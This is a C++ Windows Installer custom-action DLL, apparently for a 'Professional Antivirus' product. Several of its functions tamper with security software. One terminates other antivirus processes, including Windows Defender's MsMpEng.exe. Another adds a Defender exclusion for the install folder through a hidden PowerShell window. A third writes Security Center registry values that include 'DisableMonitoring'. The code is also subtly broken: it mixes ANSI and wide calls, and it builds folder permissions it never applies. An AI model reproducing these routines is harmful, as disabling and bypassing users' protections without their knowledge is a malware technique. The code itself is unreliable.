#include <windows.h>
#include <msiquery.h>
#include <shlobj.h>
#include <winsvc.h>
#include <tlhelp32.h>
#include <wininet.h>
#include <objbase.h>
#include <shlwapi.h>
#include <iostream>
#include <string>
#include <vector>

#pragma comment(lib, "msi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ole32.lib")

// Logging helper
void LogMessage(MSIHANDLE hInstall, LPCSTR message) {
    PMSIHANDLE hRecord = MsiCreateRecord(1);
    MsiRecordSetStringA(hRecord, 1, message);
    MsiProcessMessage(hInstall, INSTALLMESSAGE_INFO, hRecord);
}

// Check if running with administrator privileges
extern "C" __declspec(dllexport) UINT __stdcall CheckAdminPrivileges(MSIHANDLE hInstall) {
    LogMessage(hInstall, "Checking administrator privileges...");
    
    BOOL isAdmin = FALSE;
    PSID administratorsGroup = nullptr;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    
    if (AllocateAndInitializeSid(&ntAuthority, 2, 
                                SECURITY_BUILTIN_DOMAIN_RID, 
                                DOMAIN_ALIAS_RID_ADMINS,
                                0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        if (!CheckTokenMembership(NULL, administratorsGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(administratorsGroup);
    }
    
    if (!isAdmin) {
        LogMessage(hInstall, "Administrator privileges required but not found!");
        return ERROR_INSTALL_FAILURE;
    }
    
    LogMessage(hInstall, "Administrator privileges confirmed.");
    return ERROR_SUCCESS;
}

// Stop existing antivirus service if running
extern "C" __declspec(dllexport) UINT __stdcall StopExistingService(MSIHANDLE hInstall) {
    LogMessage(hInstall, "Stopping existing AntivirusService...");
    
    SC_HANDLE scManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!scManager) {
        LogMessage(hInstall, "Failed to open Service Control Manager");
        return ERROR_SUCCESS; // Continue installation
    }
    
    SC_HANDLE service = OpenService(scManager, L"AntivirusService", SERVICE_ALL_ACCESS);
    if (service) {
        SERVICE_STATUS status;
        if (QueryServiceStatus(service, &status)) {
            if (status.dwCurrentState != SERVICE_STOPPED) {
                LogMessage(hInstall, "Stopping existing service...");
                ControlService(service, SERVICE_CONTROL_STOP, &status);
                
                // Wait for service to stop (max 30 seconds)
                for (int i = 0; i < 30; i++) {
                    Sleep(1000);
                    if (QueryServiceStatus(service, &status) && 
                        status.dwCurrentState == SERVICE_STOPPED) {
                        break;
                    }
                }
                
                if (status.dwCurrentState == SERVICE_STOPPED) {
                    LogMessage(hInstall, "Existing service stopped successfully");
                } else {
                    LogMessage(hInstall, "Warning: Could not stop existing service");
                }
            }
        }
        CloseServiceHandle(service);
    }
    
    CloseServiceHandle(scManager);
    return ERROR_SUCCESS;
}

// Register with Windows Security Center
extern "C" __declspec(dllexport) UINT __stdcall RegisterSecurityCenter(MSIHANDLE hInstall) {
    LogMessage(hInstall, "Registering with Windows Security Center...");
    
    HKEY hKey;
    DWORD dwDisposition;
    
    // Register as antivirus provider
    LONG result = RegCreateKeyEx(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Security Center\\Svc\\Vol",
        0, NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        &dwDisposition
    );
    
    if (result == ERROR_SUCCESS) {
        DWORD value = 1;
        RegSetValueEx(hKey, L"EnableFirewall", 0, REG_DWORD, 
                     (BYTE*)&value, sizeof(DWORD));
        RegCloseKey(hKey);
        LogMessage(hInstall, "Security Center registration completed");
    } else {
        LogMessage(hInstall, "Failed to register with Security Center");
    }
    
    // Set antivirus product information
    result = RegCreateKeyEx(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Security Center\\Monitoring\\AntivirusService",
        0, NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_WRITE,
        NULL,
        &hKey,
        &dwDisposition
    );
    
    if (result == ERROR_SUCCESS) {
        RegSetValueEx(hKey, L"DisableMonitoring", 0, REG_DWORD, 
                     (BYTE*)&dwDisposition, sizeof(DWORD));
        
        std::wstring productName = L"Professional Antivirus";
        RegSetValueEx(hKey, L"ProductName", 0, REG_SZ, 
                     (BYTE*)productName.c_str(), 
                     (productName.length() + 1) * sizeof(wchar_t));
        
        RegCloseKey(hKey);
    }
    
    return ERROR_SUCCESS;
}

// Unregister from Windows Security Center
extern "C" __declspec(dllexport) UINT __stdcall UnregisterSecurityCenter(MSIHANDLE hInstall) {
    LogMessage(hInstall, "Unregistering from Windows Security Center...");
    
    // Remove registry keys
    RegDeleteKey(HKEY_LOCAL_MACHINE, 
                L"SOFTWARE\\Microsoft\\Security Center\\Monitoring\\AntivirusService");
    
    RegDeleteValue(HKEY_LOCAL_MACHINE,
                   L"SOFTWARE\\Microsoft\\Security Center\\Svc\\Vol",
                   L"EnableFirewall");
    
    LogMessage(hInstall, "Security Center unregistration completed");
    return ERROR_SUCCESS;
}

// Create quarantine directory with proper permissions
extern "C" __declspec(dllexport) UINT __stdcall SetupQuarantineDirectory(MSIHANDLE hInstall) {
    LogMessage(hInstall, "Setting up quarantine directory...");
    
    // Get installation path
    DWORD pathSize = 0;
    MsiGetProperty(hInstall, L"INSTALLFOLDER", L"", &pathSize);
    
    std::wstring installPath(pathSize, L'\0');
    MsiGetProperty(hInstall, L"INSTALLFOLDER", &installPath[0], &pathSize);
    
    std::wstring quarantinePath = installPath + L"Quarantine";
    
    // Create directory structure
    if (CreateDirectory(quarantinePath.c_str(), NULL) || 
        GetLastError() == ERROR_ALREADY_EXISTS) {
        
        // Set proper permissions (System and Administrators only)
        SECURITY_ATTRIBUTES sa = { 0 };
        SECURITY_DESCRIPTOR sd = { 0 };
        InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
        
        // Create ACL
        PSID systemSid = NULL;
        PSID adminSid = NULL;
        SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
        
        AllocateAndInitializeSid(&ntAuthority, 1, SECURITY_LOCAL_SYSTEM_RID,
                                0, 0, 0, 0, 0, 0, 0, &systemSid);
        
        AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminSid);
        
        if (systemSid && adminSid) {
            EXPLICIT_ACCESS ea[2] = { 0 };
            
            // System full control
            ea[0].grfAccessPermissions = GENERIC_ALL;
            ea[0].grfAccessMode = SET_ACCESS;
            ea[0].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
            ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
            ea[0].Trustee.ptstrName = (LPTSTR)systemSid;
            
            // Administrators full control
            ea[1].grfAccessPermissions = GENERIC_ALL;
            ea[1].grfAccessMode = SET_ACCESS;
            ea[1].grfInheritance = SUB_CONTAINERS_AND_OBJECTS_INHERIT;
            ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
            ea[1].Trustee.ptstrName = (LPTSTR)adminSid;
            
            PACL dacl = NULL;
            if (SetEntriesInAcl(2, ea, NULL, &dacl) == ERROR_SUCCESS) {
                SetSecurityDescriptorDacl(&sd, TRUE, dacl, FALSE);
                sa.nLength = sizeof(SECURITY_ATTRIBUTES);
                sa.lpSecurityDescriptor = &sd;
                sa.bInheritHandle = FALSE;
                
                LogMessage(hInstall, "Quarantine directory permissions set");
            }
            
            if (dacl) LocalFree(dacl);
        }
        
        if (systemSid) FreeSid(systemSid);
        if (adminSid) FreeSid(adminSid);
        
        LogMessage(hInstall, "Quarantine directory setup completed");
    } else {
        LogMessage(hInstall, "Failed to create quarantine directory");
    }
    
    return ERROR_SUCCESS;
}

// Download initial signature database
extern "C" __declspec(dllexport) UINT __stdcall DownloadSignatureDatabase(MSIHANDLE hInstall) {
    LogMessage(hInstall, "Downloading initial signature database...");
    
    HINTERNET hInternet = InternetOpen(L"AntivirusInstaller/1.0", 
                                      INTERNET_OPEN_TYPE_PRECONFIG, 
                                      NULL, NULL, 0);
    if (!hInternet) {
        LogMessage(hInstall, "Failed to initialize internet connection");
        return ERROR_SUCCESS; // Continue with bundled signatures
    }
    
    HINTERNET hUrl = InternetOpenUrl(hInternet, 
                                    L"https://updates.yourcompany.com/signatures/latest.db",
                                    NULL, 0, 
                                    INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE,
                                    0);
    
    if (hUrl) {
        // Get installation path
        DWORD pathSize = 0;
        MsiGetProperty(hInstall, L"INSTALLFOLDER", L"", &pathSize);
        
        std::wstring installPath(pathSize, L'\0');
        MsiGetProperty(hInstall, L"INSTALLFOLDER", &installPath[0], &pathSize);
        
        std::wstring dbPath = installPath + L"Database\\signatures_latest.db";
        
        // Download and save
        HANDLE hFile = CreateFile(dbPath.c_str(), GENERIC_WRITE, 0, NULL,
                                 CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        
        if (hFile != INVALID_HANDLE_VALUE) {
            char buffer[4096];
            DWORD bytesRead, bytesWritten;
            
            while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
                WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
            }
            
            CloseHandle(hFile);
            LogMessage(hInstall, "Latest signature database downloaded");
        }
        
        InternetCloseHandle(hUrl);
    } else {
        LogMessage(hInstall, "Could not download latest signatures, using bundled version");
    }
    
    InternetCloseHandle(hInternet);
    return ERROR_SUCCESS;
}

// Terminate conflicting antivirus processes
extern "C" __declspec(dllexport) UINT __stdcall TerminateConflictingProcesses(MSIHANDLE hInstall) {
    LogMessage(hInstall, "Checking for conflicting antivirus processes...");
    
    // List of known conflicting processes
    std::vector<std::wstring> conflictingProcesses = {
        L"avguard.exe",      // Avira
        L"avgnt.exe",        // Avira
        L"avp.exe",          // Kaspersky
        L"mcshield.exe",     // McAfee
        L"savservice.exe",   // Sophos
        L"bdagent.exe",      // Bitdefender
        L"MsMpEng.exe"       // Windows Defender (we'll disable instead)
    };
    
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return ERROR_SUCCESS;
    }
    
    PROCESSENTRY32W pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32W);
    
    if (Process32FirstW(snapshot, &pe)) {
        do {
            for (const auto& process : conflictingProcesses) {
                if (_wcsicmp(pe.szExeFile, process.c_str()) == 0) {
                    LogMessage(hInstall, "Found conflicting process, attempting to terminate...");
                    
                    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProcess) {
                        if (TerminateProcess(hProcess, 0)) {
                            LogMessage(hInstall, "Conflicting process terminated");
                        }
                        CloseHandle(hProcess);
                    }
                }
            }
        } while (Process32NextW(snapshot, &pe));
    }
    
    CloseHandle(snapshot);
    return ERROR_SUCCESS;
}

// Configure Windows Defender exclusions
extern "C" __declspec(dllexport) UINT __stdcall ConfigureDefenderExclusions(MSIHANDLE hInstall) {
    LogMessage(hInstall, "Configuring Windows Defender exclusions...");
    
    // Get installation path
    DWORD pathSize = 0;
    MsiGetProperty(hInstall, L"INSTALLFOLDER", L"", &pathSize);
    
    std::wstring installPath(pathSize, L'\0');
    MsiGetProperty(hInstall, L"INSTALLFOLDER", &installPath[0], &pathSize);
    
    // Add installation directory to Defender exclusions via PowerShell
    std::wstring command = L"powershell -Command \"Add-MpPreference -ExclusionPath '" + 
                          installPath + L"'\"";
    
    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000); // 10 second timeout
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        LogMessage(hInstall, "Windows Defender exclusions configured");
    }
    
    return ERROR_SUCCESS;
}

// Verify installation integrity
extern "C" __declspec(dllexport) UINT __stdcall VerifyInstallation(MSIHANDLE hInstall) {
    LogMessage(hInstall, "Verifying installation integrity...");
    
    // Get installation path
    DWORD pathSize = 0;
    MsiGetProperty(hInstall, L"INSTALLFOLDER", L"", &pathSize);
    
    std::wstring installPath(pathSize, L'\0');
    MsiGetProperty(hInstall, L"INSTALLFOLDER", &installPath[0], &pathSize);
    
    // Check critical files
    std::vector<std::wstring> criticalFiles = {
        installPath + L"Service\\AntivirusService.exe",
        installPath + L"Client\\AntivirusClient.exe",
        installPath + L"Database\\signatures.db"
    };
    
    for (const auto& file : criticalFiles) {
        if (GetFileAttributesW(file.c_str()) == INVALID_FILE_ATTRIBUTES) {
            LogMessage(hInstall, "Critical file missing, installation may be corrupted");
            return ERROR_INSTALL_FAILURE;
        }
    }
    
    // Verify service is registered
    SC_HANDLE scManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (scManager) {
        SC_HANDLE service = OpenService(scManager, L"AntivirusService", SERVICE_QUERY_STATUS);
        if (!service) {
            LogMessage(hInstall, "Service not registered properly");
            CloseServiceHandle(scManager);
            return ERROR_INSTALL_FAILURE;
        }
        CloseServiceHandle(service);
        CloseServiceHandle(scManager);
    }
    
    LogMessage(hInstall, "Installation verification completed successfully");
    return ERROR_SUCCESS;
}

// DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
